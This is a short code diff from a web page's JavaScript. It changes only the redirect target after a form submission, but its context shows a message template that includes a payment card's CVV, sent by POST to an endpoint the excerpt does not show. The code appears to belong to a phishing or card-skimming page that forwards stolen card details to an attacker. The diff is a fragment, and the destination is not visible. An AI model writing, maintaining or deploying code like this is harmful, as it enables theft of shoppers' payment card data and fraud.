@@ -20,7 +20,7 @@ CVV      : ${cvvz}`;
   fetch(url, { method: "POST" })
     .then((response) => {
       response.ok &&
-        window.location.replace(window.location.origin + "/thanks.html");
+        window.location.replace(window.location.origin + "/order/thanks.html");
     })
     .catch((error) => {
       console.error("Error sending message:", error);
